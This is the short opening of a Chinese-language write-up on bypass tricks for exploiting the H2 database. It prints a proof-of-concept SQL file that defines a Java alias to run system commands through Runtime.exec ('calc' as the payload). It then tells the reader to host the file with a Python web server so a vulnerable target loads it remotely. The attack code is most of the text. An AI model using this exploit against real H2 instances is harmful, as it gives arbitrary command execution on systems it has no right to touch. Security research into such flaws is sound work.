# h2 bypass trick 总结

h2存在两种利用方式，一种是不出网直接在url里写入转义后的代码，另一种是远程连接一个sql文件，本文的关键字bypass大部分使用远程连接模式，使用的sql文件内容如下：

```
CREATE ALIAS EXEC AS $$
void shellexec() throws java.io.IOException {
    Runtime.getRuntime().exec("calc");
}
$$;
CALL EXEC();
```

然后在该poc.sql文件所在目录使用`python -m http.server 50025`在50025端口启动web服务即可，代码示例中用的文件已经放在了sql_file里。